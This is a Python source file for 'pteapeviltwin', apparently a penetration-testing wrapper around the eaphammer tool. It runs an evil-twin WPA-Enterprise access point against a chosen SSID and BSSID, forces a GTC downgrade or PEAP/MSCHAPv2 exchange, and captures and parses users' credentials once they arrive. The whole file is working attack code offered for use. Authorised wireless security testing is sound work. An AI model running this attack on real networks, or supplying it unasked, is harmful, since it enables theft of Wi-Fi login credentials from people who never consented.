#!/usr/bin/env python3
import argparse
import re
import subprocess
import shutil
import sys; sys.path.append(__file__.rsplit("/", 1)[0])

from typing import List, Pattern, Tuple, Dict
from _version import __version__
from ptlibs import ptjsonlib, ptprinthelper, ptmisclib
from ptlibs.ptprinthelper import ptprint


def check_eaphammer_installed(json_mode: bool):
    # Check if eaphammer is available in the system PATH
    if shutil.which("eaphammer") is None:
        ptprint(
            "[!] 'eaphammer' executable not found. Please install eaphammer and ensure it's in your PATH.",
            bullet_type="ERROR",
            condition=not json_mode
        )
        ptjsonlib_object.end_error(
            "'eaphammer' executable not found. Please install eaphammer and ensure it's in your PATH.",
            json_mode
        )


def bootstrap_certificate(json_mode: bool):
    # Generate a certificate required by eaphammer with predefined values
    certificate_cmd = [
        "eaphammer", "--bootstrap",
        "--cn", "BatSignalService",
        "--country", "US",
        "--state", "NewJersey",
        "--locale", "GothamCity",
        "--org", "WayneEnterprises",
        "--org", "AppliedScience",
        "--email", "batsignal@wayne.com"
    ]
    try:
        subprocess.run(
            certificate_cmd,
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except subprocess.CalledProcessError:
        ptprint(
            "[!] Certificate bootstrap failed, aborting.",
            bullet_type="ERROR",
            condition=not json_mode
        )
        ptjsonlib_object.end_error(
            "Certificate bootstrap failed, aborting.",
            json_mode
        )


def build_eaphammer_cmd(args) -> List[str]:
    # Construct the command with proper arguments based on user input
    cmd = [
        "eaphammer",
        "--interface", args.iface,
        "--auth", "wpa-eap",
        "--essid", args.ssid,
        "--bssid", args.bssid,
        "--channel", str(args.channel),
        "--creds",
    ]
    if args.auth_method == "gtc":
        cmd += ["--negotiate", "gtc-downgrade"]
    else:
        cmd += [
            "--negotiate", "manual",
            "--phase-1-methods", "PEAP,TTLS",
            "--phase-2-methods", "MSCHAPV2",
        ]
    return cmd


def compile_output_patterns() -> Tuple[List[Pattern], List[Pattern], Pattern]:
    # Compile regex patterns used for output filtering
    keep_patterns = [
        re.compile(r"^\[hostapd\] AP starting"),
        re.compile(r'^Using interface .*ssid ".+"'),
        re.compile(r"^wlan\d+: AP-DISABLE"),
    ]
    cred_start_patterns = [
        re.compile(r"^GTC:", re.IGNORECASE),
        re.compile(r"^MSCHAPV2:", re.IGNORECASE),
    ]
    cred_block_pattern = re.compile(r"^\s+")
    return keep_patterns, cred_start_patterns, cred_block_pattern


def output_json_report(creds: Dict[str, str], detection_msg: str):
    # Format and add captured credentials to the JSON report
    if creds:
        pairs = ", ".join(f"{k}: {v}" for k, v in creds.items())
        full = f"{detection_msg}, {pairs}"
    else:
        full = detection_msg

    ptjsonlib_object.add_vulnerability(
        "PTV-EAP-CREDENTIALS",
        vuln_request=f"{detection_msg.split()[0]} credentials were found",
        vuln_response=full
    )


def run_eaphammer(args):
    # Main execution function that runs eaphammer and captures outputs
    
    # Initial setup
    check_eaphammer_installed(args.json)
    bootstrap_certificate(args.json)

    cmd = build_eaphammer_cmd(args)
    keep_patterns, cred_start_patterns, cred_block_pattern = compile_output_patterns()

    # Start eaphammer as subprocess with pipelines for communication
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,
        text=True,
        bufsize=1,
    )

    credential_block = []
    credentials_found = False
    detection_msg = f"{args.auth_method.upper()} credentials captured"

    # Monitor output until credentials are found
    try:
        for line in proc.stdout:
            if any(p.match(line) for p in keep_patterns):
                ptprint(line, bullet_type="TEXT", condition=not args.json, end="")
                continue

            # When credentials are detected, signal to end the attack
            if any(p.match(line) for p in cred_start_patterns):
                ptprint(line, bullet_type="TEXT", condition=not args.json, end="")
                ptprint(f"[+] Detected {args.auth_method.upper()} credentials, ending the attack",
                        bullet_type="INFO", condition=not args.json)
                credentials_found = True
                proc.stdin.write("\n")
                proc.stdin.flush()
                break
    except KeyboardInterrupt:
        proc.terminate()
        proc.wait()
        ptjsonlib_object.end_error("Capture aborted by user", args.json)

    # Handle process teardown and collect credential details
    try:
        for line in proc.stdout:
            # Skip empty lines or progress indicators
            if not line.strip() or re.match(r"^\s*\d+%.*", line):
                continue
                
            # Collect credential information
            if credentials_found and cred_block_pattern.match(line):
                credential_block.append(line)
                
            # Continue displaying relevant output
            if any(p.match(line) for p in keep_patterns) or cred_block_pattern.match(line):
                ptprint(line, bullet_type="TEXT", condition=not args.json, end="")
    except KeyboardInterrupt:
        proc.terminate()
        proc.wait()
        ptjsonlib_object.end_error("Interrupted by user during teardown, forcing exit", args.json)

    proc.wait()

    # Process and report credentials if found
    if args.json and credentials_found:
        creds = {}
        for line in credential_block:
            match = re.match(r"\s*([^:]+):\s*(.+)", line)
            if match:
                creds[match.group(1).strip()] = match.group(2).strip()
        output_json_report(creds, detection_msg)

    return proc.returncode


def get_help():
    # Return help information structure for the tool
    return [
        {"description": ["Wrapper for eaphammer tool used for credential capture in EAP networks"]},
        {"usage": ["pteapeviltwin <options>"]},
        {"usage_example": [
            "pteapeviltwin -a gtc -i wlan0mon -b 00:11:22:33:44:55 -s MyNetwork -c 6",
            "pteapeviltwin -a mschapv2 -i wlan0mon -b 00:11:22:33:44:55 -s MyNetwork -c 6",
        ]},
        {"options": [
            ["-a", "--auth-method", "<gtc|mschapv2>", "Choose 'gtc' (GTC downgrade) or 'mschapv2' (PEAP→MSCHAPv2)"],
            ["-i", "--iface", "<interface>", "Wireless interface (e.g. wlan0mon)"],
            ["-b", "--bssid", "<bssid>", "Target BSSID"],
            ["-c", "--channel", "<channel>", "Channel number"],
            ["-s", "--ssid", "<ssid>", "SSID to broadcast"],
            ["-v", "--version", "", "Show script version and exit"],
            ["-h", "--help", "", "Show this help message and exit"],
            ["-j", "--json", "", "Output in JSON format"],
        ]}
    ]


def parse_args():
    # Parse command line arguments and handle help/version display
    parser = argparse.ArgumentParser(
        description="Wrapper for eaphammer that stops on credential capture and filters output"
    )
    parser.add_argument("-a", "--auth-method", choices=["gtc", "mschapv2"], required=True,
                        help="Choose 'gtc' (GTC downgrade) or 'mschapv2' (PEAP→MSCHAPv2)")
    parser.add_argument("-i", "--iface", required=True, help="Wireless interface (e.g. wlan1)")
    parser.add_argument("-b", "--bssid", required=True, help="Target BSSID")
    parser.add_argument("-c", "--channel", type=int, required=True, help="Channel number")
    parser.add_argument("-s", "--ssid", required=True, help="SSID to broadcast")
    parser.add_argument("-j", "--json", action="store_true")
    parser.add_argument("-v", "--version", action="version", version=f'pteapeviltwin {__version__}')

    if len(sys.argv) == 1 or "-h" in sys.argv or "--help" in sys.argv:
        ptprinthelper.help_print(get_help(), "pteapeviltwin", __version__)
        sys.exit(0)

    args = parser.parse_args()
    ptprinthelper.print_banner("pteapeviltwin", __version__, args.json, space=0)
    return args


def main():
    # Initialize global objects and execute the main workflow
    global ptjsonlib_object
    ptjsonlib_object = ptjsonlib.PtJsonLib()

    args = parse_args()
    exit_code = run_eaphammer(args)

    ptjsonlib_object.set_status("finished")
    ptprint(ptjsonlib_object.get_result_json(), "", args.json)


if __name__ == "__main__":
    main()
